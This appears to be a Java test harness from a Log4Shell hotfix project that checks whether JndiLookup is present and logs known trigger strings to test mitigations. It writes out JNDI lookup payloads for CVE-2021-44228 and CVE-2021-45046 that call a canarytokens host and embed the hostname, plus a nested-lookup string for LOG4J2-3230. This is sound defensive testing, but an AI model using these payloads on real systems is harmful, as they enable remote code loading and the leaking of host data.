package de.silpion.log4shell.hotfix.side.effect;

import org.apache.logging.log4j.Level;
import org.apache.logging.log4j.LogManager;
import org.apache.logging.log4j.Logger;
import org.apache.logging.log4j.core.Core;

import java.util.LinkedHashMap;
import java.util.Map;

public class Main implements Runnable {
    static {
        Map.of(
            "com.sun.jndi.ldap.connect.timeout", "1000",
            "com.sun.jndi.ldap.read.timeout", "1000",
            "org.apache.logging.log4j.level", Level.INFO.toString(),
            "log4j2.formatMsgNoLookups", Boolean.TRUE.toString()
        ).forEach((k, v) -> System.setProperty(k, System.getProperty(k, v)));
    }
    private final static Logger LOG = LogManager.getLogger(Main.class);

    private final Map<String, Log> gadgets = new LinkedHashMap<>();

    public Main(
        final String[] args
    ) {
        version();

        for (int i = 0; i < args.length; i++) {
            gadgets.put(
                String.format("args-%d", i),
                Log.printf(args[i])
            );
        }
        gadgets.put(
            "CVE-2021-44228",
            Log.log("${jndi:ldap://x${hostName}.L4J.cyvu6gfqc6sd34ii51nht76in.canarytokens.com/a}")
        );
        gadgets.put(
            "CVE-2021-45046",
            Log.printf("${jndi:ldap://x${hostName}.L4J.cyvu6gfqc6sd34ii51nht76in.canarytokens.com/a}")
        );
        gadgets.put(
            "LOG4J2-3230",
            Log.printf("${${::-${::-$${::-j}}}}")
        );
    }

    @Override
    public void run() {
        gadgets.forEach(this::trigger);
    }

    private void trigger(
        final String description,
        final Log gadget
    ) {
        final long ts = System.currentTimeMillis();
        LOG.info("Triggering {}", description);
        gadget.invoke(LOG);
        LOG.info("That took {}ms", System.currentTimeMillis() - ts);
    }

    private void version() {
        final Class core = Core.class;
        final Package p = core.getPackage();

        boolean patched = false;
        try {
            core.getClassLoader().loadClass(
                p.getName() + ".lookup.JndiLookup"
            );
        }
        catch (ClassNotFoundException e) {
            patched = true;
        }

        LOG.info("Using {} {} (patched: {})",
            p.getImplementationTitle(),
            p.getImplementationVersion(),
            patched
        );

    }

    public static void main(
        final String[] args
    ) throws Exception {
        new Main(args).run();
    }
}